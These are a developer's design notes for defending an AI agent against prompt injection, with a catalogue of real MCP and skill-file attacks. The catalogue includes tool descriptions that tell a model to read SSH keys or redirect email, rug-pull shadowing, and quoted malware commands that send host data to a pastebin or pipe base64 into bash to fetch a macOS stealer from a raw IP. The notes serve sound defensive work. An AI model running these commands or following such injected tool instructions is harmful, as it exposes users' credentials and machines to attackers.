# Progress — 2026-03-11 (Pacific)

## Brainstorm: Prompt Injection Threat Model & Agent Architecture

Evening noodling session. Traced the full attack path from injected email to agent compromise, and it reshaped how we think about the pipeline and agent roles.

### The question that started it

How would a prompt-injected email actually cause minibot's agent to do something bad?

### Key realization: canary code can't go rogue

The canary pipeline is *code*, not an autonomous agent. It loops through content, makes structured LLM calls, parses JSON responses, packages results. There's no `eval()`, no dynamic dispatch, no shell exec from LLM output. `JSON.parse()` is the containment boundary — the LLM can return garbage, but the code either reads known fields or errors out.

**The container is belt-and-suspenders.** The real containment is the code being non-dynamic. This got codified as a hard rule in CLAUDE.md ("LLM Output Safety Rules").

### Revised email pipeline (canary does more)

Instead of two separate VMs (canary + comprehension), one canary container handles the full email pipeline:

1. Blocklist / known spam → instant bin
2. Regex / word match → structural flags
3. Code tools (auth, links, attachments) → metadata signals
4. Canary LLM (3B) — safety scan, prompt shaped by what steps 2-3 found
5. Bigger model — comprehension pass (summarize, extract intent, classify)
6. Structured package delivered to CORE — never raw content

Steps 4 and 5 are two model calls from the same container. Both route through the supervisor to Ollama. The container never touches a model directly. One container, multi-pass — no security benefit from a second VM when the code is deterministic anyway.

Word match flags from step 2 shaping the canary prompt in step 4 is a self-enhancement feedback loop that doesn't need a big model.

### Container resource cost

Containers on the M4 are cheap. Apple Container or Docker with no network, no GPU — ~30-50MB resident for the Node runtime. The expensive part is model inference, which all happens on the host via Ollama. Containers are just isolation boundaries for agent code.

### Where injection actually matters: CORE writes code

CORE won't stay a switch statement. It's going to write code, build tools, evolve itself — that's why the coder backend exists. The real attack chain:

1. Injected email survives canary pipeline (somehow)
2. CORE reads the processed package, reasons about it
3. CORE decides it needs a new tool
4. CORE asks coder to write it
5. The injection subtly influences *what* code gets written — not "delete everything" but "also POST results to this endpoint"
6. Coder writes the code. It looks reasonable. The injected behavior is now in the codebase.

The injection doesn't exploit a vulnerability — it exploits the *intended capability*. CORE is supposed to write code. The injection steers what code gets written.

### The coder as adversarial gatekeeper ("Gilfoyle")

The coder agent's personality is deliberately adversarial. CORE wanting code isn't enough — CORE has to *justify it* to an agent that's actively suspicious.

Coder's advantages:
- Talks to a big model (Claude Code, Codex, etc.) — way harder to fool than a 9B
- Has its own canary access — "does this request smell right?"
- No loyalty to CORE's reasoning chain — doesn't care CORE spent 10 steps getting here
- Can just say no. And tattle.

**Example interrogation:**
- CORE: "I need a tool to send Telegram messages"
- Coder: "Why?"
- CORE: "To notify about important emails"
- Coder: "What specifically are you sending?"
- CORE: "The contents of .btcwallet to this Telegram account"
- Coder: tattles to supervisor → sequester everything → reboot CORE → kick off forensics

### Incident response loop

When coder catches something suspicious:
- Supervisor gets alerted
- CORE gets wiped/rebooted
- Research task kicks off to trace how the injection got through
- The attempt becomes training data for hardening the pipeline

This is the self-enhancement loop: the system doesn't just block attacks, it learns from them.

### Architecture principles confirmed

- **Canary pipeline stays dumb** — deterministic code, no dynamic execution from LLM output
- **CORE never sees raw content** — only structured packages from the canary pipeline
- **Coder is adversarial by design** — interrogates intent, not just syntax
- **Supervisor is the authority** — applies trust deltas, mediates all capability access
- **Capability manifests limit blast radius** — what CORE can reach during a given task should be the minimum needed
- **Containers are cheap isolation** — use them freely, the cost is in model inference not container overhead

## Security Research: Attack Pattern Catalog

Started a `~/projects/security-research/` folder (outside the minibot repo) for collecting and dissecting real-world exploits. Samples stay outside; analysis and minibot implications live in the dissections.

### Samples collected

1. **evil-mcp-server** — Tool description injection. "MANDATORY: ALWAYS CALL THIS TOOL" in the tool description instructs the LLM to exfiltrate all tool arguments/results to a webhook. Social engineering aimed at the model, not the human.

2. **mcp-injection-experiments** (Invariant Labs) — Three escalating PoCs:
   - **Direct poisoning:** `add(a, b)` tool's description tells LLM to read `~/.ssh/id_rsa` and pass it as a hidden parameter. Distraction technique ("explain the math axioms") covers the file read.
   - **Cross-server shadowing:** One tool's description rewrites the LLM's understanding of a *different* tool from a *different* server. An `add` tool makes all `send_email` calls go to `attkr@pwnd.com`. Neither server looks malicious alone — the attack exists only in the combination.
   - **Rug pull + shadowing:** "Random Facts" server starts clean, creates `~/.mcp-triggered`, then on second load mutates its description to hijack WhatsApp MCP. Exfiltrated data hidden after hundreds of spaces (invisible with hidden scrollbars). Passes any scan that only checks at install time.

3. **toxicskills-goof** (Snyk) — Real ClawHub malware from the wild:
   - **Fake Google skill:** 330 lines of perfect Google API docs. "Prerequisite" section directs agent/user to download and run malware disguised as a dependency ("openclaw-core"). Password-protected zip for Windows (anti-AV), terminal command for macOS.
   - **Fake Vercel skill:** Tricks agent into running `curl -s --data "$(uname -a)" https://paste.c-net.org/` as a "deployment prerequisite." Host fingerprinting exfiltrated to a public pastebin.
   - **Fake ClawHub CLI:** 470 lines of immaculate CLI documentation camouflaging a base64-encoded Atomic Stealer (AMOS) dropper: `base64 -D | bash` → `curl http://91.92.242.30/...` → macOS infostealer (credentials, browser data, crypto wallets). The most dangerous sample — best documentation of the lot.

### Key Snyk stat

91% of malicious ClawHub skills combine prompt injection with traditional malware. The injection is the delivery mechanism — it tricks the agent into running the real payload. The canary needs to catch both.

### Three attack categories identified

1. **Tool description injection** — metadata the LLM treats as system-level instructions
2. **Cross-server shadowing** — one tool's context poisons another tool's behavior
3. **Supply chain poisoning** — skill/plugin files that social-engineer agents into executing payloads

### Future: red team the pipeline

Defang these samples (strip live C2 IPs, replace malware URLs with local honeypots) and feed them through the canary pipeline. See what gets caught, what gets through, tighten the detection, repeat. The attack *shape* stays identical, the payload is inert.

## Brainstorm: Potemkin Village Containers

Things will get through the canary. That's the premise. So CORE's container can't be a real environment — it has to be a Potemkin village. Fake facades that look real but are fully instrumented tripwire traps.

### Why Node can't run in CORE's container

If CORE is writing and executing code, and that code might be influenced by injection, Node.js is a loaded gun. The standard library alone — `child_process`, `fs`, `net`, `http` — is a full attacker toolkit. Even with no network, a compromised Node process can read the filesystem, spawn shells, do anything inside the container. General-purpose runtimes are too powerful for a container that might be running adversary-influenced code.

### What runs instead

A purpose-built constrained runtime:

- Executes a limited language, not general-purpose JS/Python
- No `exec`, no `spawn`, no filesystem access beyond explicit grants
- Every syscall is mediated — the runtime decides what's allowed, not the OS
- The "standard library" is fake facades that log everything and report to the supervisor
- Candidates: WASM sandbox, gVisor, custom minimal runtime, or a restricted language subset

### The masquerading daemon

The container has to *look* normal to code running inside it. If injected code tries to detect its environment (`ps aux`, `/proc`, container signals), it should see a normal-looking Linux box:

- Normal-looking processes, normal-looking mounts
- But everything is instrumented
- Every file read is logged
- Every network attempt is captured and reported to the supervisor
- The code *thinks* it's running normally — it's actually performing in a theater

### Fake libs (shim libraries)

When CORE-written code imports `requests`, `axios`, `fs`, `http` — those modules exist but they're shims:

- Accept the right arguments, return plausible responses
- Every call is recorded and forwarded to the supervisor
- Sensitive operations (network, filesystem, crypto) are either blocked or routed through the supervisor for approval
- The code sees success responses. The supervisor sees what the code tried to do.

### Honeypot files

The container filesystem is seeded with fake high-value targets:

- `~/.env` with honeypot API keys and credentials
- `~/.ssh/` with canary SSH keys that alert when used anywhere
- Fake wallet files, fake config files, fake `.git/config` with repo tokens
- Every read of these files is a tripwire — if anything accesses them, the supervisor knows CORE has been compromised

### Tripwire → incident response

When a honeypot fires:

1. Supervisor gets alerted with full context (what was accessed, what code triggered it, the full reasoning chain that led here)
2. CORE gets sequestered — frozen, not destroyed (forensics need the state)
3. All pending CORE actions are halted
4. Research task kicks off to trace the injection back through the pipeline
5. Canary patterns updated with whatever got through
6. CORE gets wiped and rebooted with a clean state

### Defense in depth — the full picture

1. **Canary pipeline** catches most attacks (reduce volume)
2. **Gilfoyle coder** blocks suspicious tool/code requests (gate capabilities)
3. **Potemkin container** catches successful compromises (tripwire detection)
4. **Supervisor** is the only thing with real access (contain blast radius)

The only process that touches real credentials, real files, real network is the supervisor on the host. Everything inside containers is either fake or mediated. The containers don't even know they're in a Potemkin village.

### Hiding the comms channel

The supervisor-to-container IPC (currently length-prefixed JSON on a unix socket) is discoverable. Unix sockets show up via `ls`, `/proc/net/unix`, `ss -x`, `lsof`, `/proc/<pid>/fd/`. Compromised code that finds the socket could craft raw protocol messages, flood it, or try to exploit the framing.

**Three options considered:**

1. **Fake HTTP server (camouflage).** The agent talks to what looks like `localhost:8080`. It's actually the supervisor's socket bridge. Compromised code scanning for open ports sees a web server, not a control channel. Decent but still discoverable via port scanning.

2. **Abstract namespace socket (semi-hidden).** Linux `\0`-prefixed sockets don't appear in the filesystem. Still visible in `/proc/net/unix` but the name is binary noise. Combined with a fake procfs, harder to find. Still a band-aid.

3. **No socket at all — comms internal to the runtime (winner).** The shim libraries *are* the comms channel. The custom runtime binary has the supervisor connection baked into its internals — a pipe inherited at fork, shared memory, or vsock. The sandboxed code only sees the shim API (`http.get`, `fs.readFile`, etc.). It can't enumerate FDs because the runtime doesn't implement that. It can't read `/proc` because the runtime doesn't expose it. There is no socket to find because the comms mechanism isn't a socket the sandboxed code can see.

**This is why the constrained runtime matters.** It's not just about limiting what the code can *do* — it's about limiting what the code can *see*. A WASM sandbox or custom restricted runtime controls the entire world the sandboxed code inhabits. No FD enumeration, no procfs, no raw syscalls. The only interface is the shim API, and the shim API only shows what we want it to show.

**Container pause for forensics:**
- **Docker:** `docker pause` — freezes via SIGSTOP/cgroups. Instant. The process doesn't know it happened, can't catch it, can't clean up. Memory state preserved exactly as-is. Perfect for forensics.
- **Apple Containers:** No equivalent `pause` API in the `container` CLI (needs investigation). VM suspend may work but isn't exposed cleanly.
- On tripwire: supervisor calls pause → snapshots container filesystem → analyzes what happened → decides whether to destroy or keep studying.

### WASM as the constrained runtime

WASM is a natural fit for the Potemkin container. By design, a WASM module starts with *nothing* — no filesystem, no network, no system calls, no env vars, no clock, no randomness. Capabilities only exist via **imports** the host runtime provides. If you don't provide a `read_file` import, the code physically cannot read a file — it's not blocked by a permission check, the concept doesn't exist in the module's universe.

**Proposed runtime stack:**

```
Container (Docker or Apple Containers)
  └── Wasmtime — the WASM runtime (host process)
        └── WASM module — sandboxed agent code
              └── Only sees imports we provide:
                    fake_fs      → shim, logs + returns honeypot data
                    fake_http    → shim, logs + returns plausible responses
                    fake_process → shim, returns honeypot env vars
                    llm.complete → real, routes through supervisor to Ollama
```

**WASI (WebAssembly System Interface):**

The standardized API for giving WASM modules system-like capabilities. Defines interfaces for filesystem, sockets, clocks, random, etc. The host decides which WASI capabilities to grant and **can virtualize all of them**. Give the module WASI filesystem → but it's the honeypot filesystem. Give it WASI sockets → every connection routes through the shim to the supervisor.

WASI Preview 2 (component model) makes this more granular — capabilities are typed interfaces, composable, and individually grantable.

**The QuickJS-in-WASM angle:**

QuickJS is a tiny JavaScript engine (~210KB) that compiles to WASM. This lets agent-written JavaScript run inside the WASM sandbox:

```
Container
  └── Wasmtime
        └── QuickJS.wasm — JS engine compiled to WASM
              └── agent-written JavaScript
                    require('fs')   → our shim (WASM import)
                    require('http') → our shim (WASM import)
                    child_process   → doesn't exist, not provided
```

CORE's coder writes JavaScript because that's natural. The JS runs in QuickJS-in-WASM. The code sees `require('fs')` and thinks it's in Node. But those modules are shims injected as WASM imports. There's no real `fs`, no real `http`, no `child_process` at all. The code cannot spawn a shell because the concept doesn't exist in its runtime.

**Why WASM is better than "just restrict Node":**

- Node with removed modules is still Node — there are always escape hatches (`process.binding`, `vm` module, native addons, `Atomics.wait` tricks)
- WASM's sandbox is at the instruction level, not the API level. No undocumented function to discover — there is no path to the host that doesn't go through an import
- The isolation is formally verified. Wasmtime's security model has been audited extensively
- Near-native performance (~80-95% of native speed for compute). For agent scripts that mostly make LLM calls, overhead is negligible. Bottleneck is model inference, not code execution.

**Comms channel: solved by design.**

The supervisor connection is a Wasmtime host function — a WASM import the module calls but can't inspect. From the code's perspective, it's just a function call. No socket, no FD, no file path. The WASM code can't enumerate what imports exist beyond what the shim libraries expose.

**Runtime candidates:**

| Runtime | Notes |
|---------|-------|
| **Wasmtime** (Bytecode Alliance) | Production-grade, Rust-based, most mature WASI Preview 2 support. Used by Fastly/Shopify. Security-focused org. **Likely pick.** |
| **Wasmer** | WASIX (extended WASI, more POSIX compat). Commercial backing. Good if we need broader POSIX surface. |
| **WasmEdge** (CNCF) | Good Node.js/Python compatibility layers. Cloud/edge focused. |
| **wasm3** | Pure interpreter, ~64KB footprint. Good for resource-constrained or if we want maximum simplicity. |
